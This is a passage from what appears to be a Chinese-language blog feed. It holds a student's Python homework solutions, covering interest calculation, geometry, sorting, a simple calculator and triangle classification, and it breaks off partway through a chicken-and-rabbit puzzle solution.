<h4 id="字符串转换为列表"><a href="#字符串转换为列表" class="headerlink" title="字符串转换为列表"></a>字符串转换为列表</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;hello&quot;</span></span><br><span class="line">lst = <span class="built_in">list</span>(string)</span><br></pre></td></tr></table></figure></div>

<h4 id="使用-zip-遍历多个列表"><a href="#使用-zip-遍历多个列表" class="headerlink" title="使用 zip 遍历多个列表"></a>使用 zip 遍历多个列表</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">b = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">c = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x, y, z <span class="keyword">in</span> <span class="built_in">zip</span>(a, b, c):</span><br><span class="line">    <span class="built_in">print</span>(x, y, z)</span><br></pre></td></tr></table></figure></div>

<h4 id="示例运行结果"><a href="#示例运行结果" class="headerlink" title="示例运行结果"></a>示例运行结果</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">输出结果</span><br><span class="line"><span class="number">1</span> <span class="number">4</span> <span class="number">7</span></span><br><span class="line"><span class="number">2</span> <span class="number">5</span> <span class="number">8</span></span><br><span class="line"><span class="number">3</span> <span class="number">6</span> <span class="number">9</span></span><br></pre></td></tr></table></figure></div>

<p>以上代码提供了对二维列表的创建、拼接、扩展、插入、移除、查找、字符串转换为列表以及使用 zip 遍历多个列表的示例。</p>
<h2 id="常见题型"><a href="#常见题型" class="headerlink" title="常见题型"></a>常见题型</h2>]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
      </tags>
  </entry>
  <entry>
    <title>Python课后题</title>
    <url>/posts/9974513c.html</url>
    <content><![CDATA[<h2 id="作业-1-Python-语言基础"><a href="#作业-1-Python-语言基础" class="headerlink" title="作业 1 Python 语言基础"></a>作业 1 Python 语言基础</h2><h3 id="编写程序，输入本金、年利率和年数、计算复利（结果保留两位小数）"><a href="#编写程序，输入本金、年利率和年数、计算复利（结果保留两位小数）" class="headerlink" title="编写程序，输入本金、年利率和年数、计算复利（结果保留两位小数）"></a>编写程序，输入本金、年利率和年数、计算复利（结果保留两位小数）</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_compound_interest</span>(<span class="params">principal, rate, years</span>):</span><br><span class="line">    <span class="comment"># 计算复利</span></span><br><span class="line">    amount = principal * (<span class="number">1</span> + rate / <span class="number">100</span>) ** years</span><br><span class="line">    <span class="comment"># 保留两位小数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(amount, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">principal = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入本金: &quot;</span>))</span><br><span class="line">rate = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入年利率: &quot;</span>))</span><br><span class="line">years = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入年数: &quot;</span>))</span><br><span class="line"></span><br><span class="line">compound_interest = calculate_compound_interest(principal, rate, years)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;本金利率和为: <span class="subst">&#123;compound_interest&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt; python -u &quot;d:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1\2.py&quot;</span><br><span class="line">请输入本金: 2000</span><br><span class="line">请输入年利率: 5.6</span><br><span class="line">请输入年数: 5</span><br><span class="line">本金利率和为: 2626.33</span><br><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，输入球的半径，计算球的表面积和体积（结果保留两位小数）"><a href="#编写程序，输入球的半径，计算球的表面积和体积（结果保留两位小数）" class="headerlink" title="编写程序，输入球的半径，计算球的表面积和体积（结果保留两位小数）"></a>编写程序，输入球的半径，计算球的表面积和体积（结果保留两位小数）</h3><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">r = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入球的半径: &quot;</span>))</span><br><span class="line">S = <span class="number">4</span> * math.pi * r**<span class="number">2</span></span><br><span class="line">V = <span class="number">4</span> / <span class="number">3</span> * math.pi * r**<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;球的表面积为: <span class="subst">&#123;S:<span class="number">.2</span>f&#125;</span>, 体积为: <span class="subst">&#123;V:<span class="number">.2</span>f&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="输出结果-1"><a href="#输出结果-1" class="headerlink" title="输出结果"></a>输出结果</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt; python -u &quot;d:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1\3.py&quot;</span><br><span class="line">请输入球的半径: 2.5</span><br><span class="line">球的表面积为: 78.54, 体积为: 65.45</span><br><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，声明-getValue-b-r-n-，根据本金-b，年利率-r-和年数-n-计算最终收益-v，v-b-1-r-n-，然后编写测试代码，提示输入本金、年利率和年数、显示最终收益（保留两位小数）"><a href="#编写程序，声明-getValue-b-r-n-，根据本金-b，年利率-r-和年数-n-计算最终收益-v，v-b-1-r-n-，然后编写测试代码，提示输入本金、年利率和年数、显示最终收益（保留两位小数）" class="headerlink" title="编写程序，声明 getValue(b, r, n)，根据本金 b，年利率 r 和年数 n 计算最终收益 v，v &#x3D; b(1+r) n ，然后编写测试代码，提示输入本金、年利率和年数、显示最终收益（保留两位小数）"></a>编写程序，声明 getValue(b, r, n)，根据本金 b，年利率 r 和年数 n 计算最终收益 v，v &#x3D; b(1+r)<sup> n </sup>，然后编写测试代码，提示输入本金、年利率和年数、显示最终收益（保留两位小数）</h3><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getValue</span>(<span class="params">b, r, n</span>):</span><br><span class="line">    <span class="keyword">return</span> b * (<span class="number">1</span> + r) ** n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试代码</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入本金: &quot;</span>))</span><br><span class="line">    r = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入年利率(小数形式): &quot;</span>))</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入年数: &quot;</span>))</span><br><span class="line">    v = getValue(b, r, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;最终收益为: <span class="subst">&#123;v:<span class="number">.2</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt; python -u &quot;d:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1\tempCodeRunnerFile.py&quot;</span><br><span class="line">请输入本金: 100</span><br><span class="line">请输入年利率(小数形式): 2.5</span><br><span class="line">请输入年数: 5</span><br><span class="line">最终收益为: 52521.88</span><br><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，求解一元二次方程-x²-10x-16-0"><a href="#编写程序，求解一元二次方程-x²-10x-16-0" class="headerlink" title="编写程序，求解一元二次方程 x² - 10x + 16 &#x3D; 0"></a>编写程序，求解一元二次方程 x² - 10x + 16 &#x3D; 0</h3><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = -<span class="number">10</span></span><br><span class="line">c = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判别式</span></span><br><span class="line">delta = b**<span class="number">2</span> - <span class="number">4</span> * a * c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> delta &gt; <span class="number">0</span>:</span><br><span class="line">    root1 = (-b + math.sqrt(delta)) / (<span class="number">2</span> * a)</span><br><span class="line">    root2 = (-b - math.sqrt(delta)) / (<span class="number">2</span> * a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;方程有两个不同的实数根: <span class="subst">&#123;root1&#125;</span> 和 <span class="subst">&#123;root2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> delta == <span class="number">0</span>:</span><br><span class="line">    root = -b / (<span class="number">2</span> * a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;方程有一个实数根: <span class="subst">&#123;root&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;方程无实数根&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="输出结果-2"><a href="#输出结果-2" class="headerlink" title="输出结果"></a>输出结果</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt; python -u &quot;d:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1\tempCodeRunnerFile.py&quot;</span><br><span class="line">方程有两个不同的实数根: 8.0 和 2.0</span><br><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="编写程序，提示输入姓名和出生年份，输出姓名和年龄"><a href="#编写程序，提示输入姓名和出生年份，输出姓名和年龄" class="headerlink" title="编写程序，提示输入姓名和出生年份，输出姓名和年龄"></a>编写程序，提示输入姓名和出生年份，输出姓名和年龄</h3><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编写程序，提示输入姓名和出生年份，输出姓名和年龄</span></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;请输入姓名: &quot;</span>)</span><br><span class="line">year = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入出生年份: &quot;</span>))</span><br><span class="line">age = <span class="number">2024</span> - year</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;您好！<span class="subst">&#123;name&#125;</span>。今年<span class="subst">&#123;age&#125;</span>岁&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="输出结果-3"><a href="#输出结果-3" class="headerlink" title="输出结果"></a>输出结果</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt; python -u &quot;d:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1\6.py&quot;</span><br><span class="line">请输入姓名: W1ndys</span><br><span class="line">请输入出生年份: 2004</span><br><span class="line">您好！W1ndys。今年20岁</span><br><span class="line">PS D:\Documents\StudyData\QFNU\AAA课程\Python\课程\作业1&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="作业-2-程序流程控制"><a href="#作业-2-程序流程控制" class="headerlink" title="作业 2 程序流程控制"></a>作业 2 程序流程控制</h2><h3 id="编写程序，格式化输出杨辉三角。杨辉三角即二项式定理的系数表，各元素满足如下条件：第一列及对角线上的元素均为-1；其余每个元素等于它上一行同一列元素与前一列元素之和。"><a href="#编写程序，格式化输出杨辉三角。杨辉三角即二项式定理的系数表，各元素满足如下条件：第一列及对角线上的元素均为-1；其余每个元素等于它上一行同一列元素与前一列元素之和。" class="headerlink" title="编写程序，格式化输出杨辉三角。杨辉三角即二项式定理的系数表，各元素满足如下条件：第一列及对角线上的元素均为 1；其余每个元素等于它上一行同一列元素与前一列元素之和。"></a>编写程序，格式化输出杨辉三角。杨辉三角即二项式定理的系数表，各元素满足如下条件：第一列及对角线上的元素均为 1；其余每个元素等于它上一行同一列元素与前一列元素之和。</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">杨辉三角</span><br><span class="line">i = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入行数: &quot;</span>))</span><br><span class="line">number_list = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">    number_list.insert(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(number_list) - <span class="number">1</span>):</span><br><span class="line">        number_list[k] = number_list[k] + number_list[k + <span class="number">1</span>]</span><br><span class="line">    line = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> number_list:</span><br><span class="line">        line += <span class="built_in">str</span>(_) + <span class="string">&quot; &quot;</span></span><br><span class="line">    <span class="built_in">print</span>(line.center(i * <span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>

<h3 id="输入直角三角形的两个直角边，求三角形的周长和面积，以及两个锐角的度数。结果均保留一位小数。其运行效果如图-44-所示。"><a href="#输入直角三角形的两个直角边，求三角形的周长和面积，以及两个锐角的度数。结果均保留一位小数。其运行效果如图-44-所示。" class="headerlink" title="输入直角三角形的两个直角边，求三角形的周长和面积，以及两个锐角的度数。结果均保留一位小数。其运行效果如图 44 所示。"></a>输入直角三角形的两个直角边，求三角形的周长和面积，以及两个锐角的度数。结果均保留一位小数。其运行效果如图 44 所示。</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">i, j = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入三角形的直角边A(&gt;0): &quot;</span>)), <span class="built_in">int</span>(</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;请输入三角形的直角边B(&gt;0): &quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;直角三角形的三边分别为: a=<span class="subst">&#123;i:<span class="number">.1</span>f&#125;</span>, b=<span class="subst">&#123;j:<span class="number">.1</span>f&#125;</span>, c=<span class="subst">&#123;math.sqrt(i**<span class="number">2</span> + j**<span class="number">2</span>):<span class="number">.1</span>f&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;三角形的周长 = <span class="subst">&#123;i + j + math.sqrt(i**<span class="number">2</span> + j**<span class="number">2</span>):<span class="number">.1</span>f&#125;</span>，面积 = <span class="subst">&#123;i * j / <span class="number">2</span>:<span class="number">.1</span>f&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="string">f&quot;三角形两个锐角的度数分别为: <span class="subst">&#123;<span class="built_in">round</span>(math.asin(i / math.sqrt(i**<span class="number">2</span> + j**<span class="number">2</span>)) * <span class="number">180</span> / math.pi, <span class="number">0</span>):<span class="number">.1</span>f&#125;</span> 和 <span class="subst">&#123;<span class="built_in">round</span>(math.asin(j / math.sqrt(i**<span class="number">2</span> + j**<span class="number">2</span>)) * <span class="number">180</span> / math.pi, <span class="number">0</span>):<span class="number">.1</span>f&#125;</span>&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<h3 id="编程产生-0-100（包含-0-和-100）的-3-个随机数-a、b-和-c-要求至少使用两种不同的方法，将-3-个数按从小到大的顺序排序。其运行效果如图-4-5-所示（其中，a、b-和-c-的值随机生成）。"><a href="#编程产生-0-100（包含-0-和-100）的-3-个随机数-a、b-和-c-要求至少使用两种不同的方法，将-3-个数按从小到大的顺序排序。其运行效果如图-4-5-所示（其中，a、b-和-c-的值随机生成）。" class="headerlink" title="编程产生 0~100（包含 0 和 100）的 3 个随机数 a、b 和 c, 要求至少使用两种不同的方法，将 3 个数按从小到大的顺序排序。其运行效果如图 4-5 所示（其中，a、b 和 c 的值随机生成）。"></a>编程产生 0~100（包含 0 和 100）的 3 个随机数 a、b 和 c, 要求至少使用两种不同的方法，将 3 个数按从小到大的顺序排序。其运行效果如图 4-5 所示（其中，a、b 和 c 的值随机生成）。</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接排序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">direct_sort</span>():</span><br><span class="line">    a = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    b = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    c = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;直接排序前: a=<span class="subst">&#123;a&#125;</span>, b=<span class="subst">&#123;b&#125;</span>, c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> a &gt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">if</span> a &gt; c:</span><br><span class="line">        a, c = c, a</span><br><span class="line">    <span class="keyword">if</span> b &gt; c:</span><br><span class="line">        b, c = c, b</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;直接排序后: a=<span class="subst">&#123;a&#125;</span>, b=<span class="subst">&#123;b&#125;</span>, c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sort()排序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort_sort</span>():</span><br><span class="line">    a = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    b = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">    c = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;sort()排序前: a=<span class="subst">&#123;a&#125;</span>, b=<span class="subst">&#123;b&#125;</span>, c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    a, b, c = <span class="built_in">sorted</span>([a, b, c])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;sort()排序后: a=<span class="subst">&#123;a&#125;</span>, b=<span class="subst">&#123;b&#125;</span>, c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    direct_sort()</span><br><span class="line">    sort_sort()</span><br></pre></td></tr></table></figure></div>

<h3 id="编程计算有固定工资收入的党员每月所交纳的党费。工资基数-3000-元及以下者，交纳工资基数的-0-5-；工资基数-30005000-元者，交纳工资基数的-1-；工资基数在-5000-10000-元者，交纳工资基数的-1-5-；工资基数超过-10000-元者，交纳工资基数的-2-。运行效果如图-4-6-示。"><a href="#编程计算有固定工资收入的党员每月所交纳的党费。工资基数-3000-元及以下者，交纳工资基数的-0-5-；工资基数-30005000-元者，交纳工资基数的-1-；工资基数在-5000-10000-元者，交纳工资基数的-1-5-；工资基数超过-10000-元者，交纳工资基数的-2-。运行效果如图-4-6-示。" class="headerlink" title="编程计算有固定工资收入的党员每月所交纳的党费。工资基数 3000 元及以下者，交纳工资基数的 0.5%；工资基数 30005000 元者，交纳工资基数的 1%；工资基数在 5000 10000 元者，交纳工资基数的 1.5%；工资基数超过 10000 元者，交纳工资基数的 2%。运行效果如图 4-6 示。"></a>编程计算有固定工资收入的党员每月所交纳的党费。工资基数 3000 元及以下者，交纳工资基数的 0.5%；工资基数 3000<del class="mask">5000 元者，交纳工资基数的 1%；工资基数在 5000</del> 10000 元者，交纳工资基数的 1.5%；工资基数超过 10000 元者，交纳工资基数的 2%。运行效果如图 4-6 示。</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">i = int(input(&quot;请输入有固定工资收入的党员的月工资：&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if i &lt;= 3000:</span><br><span class="line">    f = 0.5 * 0.01 * i</span><br><span class="line">elif i &lt;= 5000:</span><br><span class="line">    f = 1 * 0.01 * i</span><br><span class="line">elif i &lt;= 10000:</span><br><span class="line">    f = 1.5 * 0.01 * i</span><br><span class="line">else:</span><br><span class="line">    f = 2 * 0.01 * i</span><br><span class="line"></span><br><span class="line">print(f&quot;月工资 = &#123;i&#125;, 交纳党费 = &#123;f&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="编程实现袖珍计算器，要求输入两个操作数和一个操作符（十、一、、-、-），根据操作符输出运算结果。注意“-”和“-”运算符的零除异常问题。其运行效果如图-4-7-所示。"><a href="#编程实现袖珍计算器，要求输入两个操作数和一个操作符（十、一、、-、-），根据操作符输出运算结果。注意“-”和“-”运算符的零除异常问题。其运行效果如图-4-7-所示。" class="headerlink" title="编程实现袖珍计算器，要求输入两个操作数和一个操作符（十、一、、&#x2F;、%），根据操作符输出运算结果。注意“&#x2F;”和“%”运算符的零除异常问题。其运行效果如图 4-7 所示。"></a>编程实现袖珍计算器，要求输入两个操作数和一个操作符（十、一、、&#x2F;、%），根据操作符输出运算结果。注意“&#x2F;”和“%”运算符的零除异常问题。其运行效果如图 4-7 所示。</h3><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入操作数x：&quot;</span>))</span><br><span class="line">y = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入操作数y：&quot;</span>))</span><br><span class="line">n = <span class="built_in">input</span>(<span class="string">&quot;请输入操作符：&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> n == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x:<span class="number">.1</span>f&#125;</span> + <span class="subst">&#123;y:<span class="number">.1</span>f&#125;</span> = <span class="subst">&#123;x + y:<span class="number">.1</span>f&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> n == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x:<span class="number">.1</span>f&#125;</span> - <span class="subst">&#123;y:<span class="number">.1</span>f&#125;</span> = <span class="subst">&#123;x - y:<span class="number">.1</span>f&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> n == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x:<span class="number">.1</span>f&#125;</span> * <span class="subst">&#123;y:<span class="number">.1</span>f&#125;</span> = <span class="subst">&#123;x * y:<span class="number">.1</span>f&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> n == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x:<span class="number">.1</span>f&#125;</span> / <span class="subst">&#123;y:<span class="number">.1</span>f&#125;</span> = <span class="subst">&#123;x / y:<span class="number">.1</span>f&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入错误&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="输入三角形的-3-条边-a、b、c-判断此-3-边是否可以构成三角形。若能，进一步判断三角形的性质，即为等边、等腰、直角或其他三角形。本题的判断准则参见表-4-16。其运行效果如图-4-8-所示。"><a href="#输入三角形的-3-条边-a、b、c-判断此-3-边是否可以构成三角形。若能，进一步判断三角形的性质，即为等边、等腰、直角或其他三角形。本题的判断准则参见表-4-16。其运行效果如图-4-8-所示。" class="headerlink" title="输入三角形的 3 条边 a、b、c, 判断此 3 边是否可以构成三角形。若能，进一步判断三角形的性质，即为等边、等腰、直角或其他三角形。本题的判断准则参见表 4-16。其运行效果如图 4-8 所示。"></a>输入三角形的 3 条边 a、b、c, 判断此 3 边是否可以构成三角形。若能，进一步判断三角形的性质，即为等边、等腰、直角或其他三角形。本题的判断准则参见表 4-16。其运行效果如图 4-8 所示。</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入三角形的边a：&quot;</span>))</span><br><span class="line">b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入三角形的边b：&quot;</span>))</span><br><span class="line">c = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入三角形的边c：&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a + b &gt; c <span class="keyword">and</span> a + c &gt; b <span class="keyword">and</span> b + c &gt; a:</span><br><span class="line">    <span class="keyword">if</span> a == b == c:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;该三角形为等边三角形！&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> a == b <span class="keyword">or</span> a == c <span class="keyword">or</span> b == c:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;该三角形为等腰三角形！&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> a**<span class="number">2</span> + b**<span class="number">2</span> == c**<span class="number">2</span> <span class="keyword">or</span> a**<span class="number">2</span> + c**<span class="number">2</span> == b**<span class="number">2</span> <span class="keyword">or</span> b**<span class="number">2</span> + c**<span class="number">2</span> == a**<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;该三角形为直角三角形！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;该三角形为一般三角形！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无法构成三角形！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="编程实现鸡兔同笼问题。已知在同一个笼子里共有-h-只鸡和兔，鸡和兔的总脚数为-f-其中-h-和-f-由用户输入，求鸡和兔各有多少只？要求使用两种方法：一是求解方程；二是利用循环进行枚举测试。"><a href="#编程实现鸡兔同笼问题。已知在同一个笼子里共有-h-只鸡和兔，鸡和兔的总脚数为-f-其中-h-和-f-由用户输入，求鸡和兔各有多少只？要求使用两种方法：一是求解方程；二是利用循环进行枚举测试。" class="headerlink" title="编程实现鸡兔同笼问题。已知在同一个笼子里共有 h 只鸡和兔，鸡和兔的总脚数为 f, 其中 h 和 f 由用户输入，求鸡和兔各有多少只？要求使用两种方法：一是求解方程；二是利用循环进行枚举测试。"></a>编程实现鸡兔同笼问题。已知在同一个笼子里共有 h 只鸡和兔，鸡和兔的总脚数为 f, 其中 h 和 f 由用户输入，求鸡和兔各有多少只？要求使用两种方法：一是求解方程；二是利用循环进行枚举测试。</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">h = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入总头数：&quot;</span>))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入总脚数（必须是偶数）：&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> f % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">    f = <span class="built_in">int</span>(<span 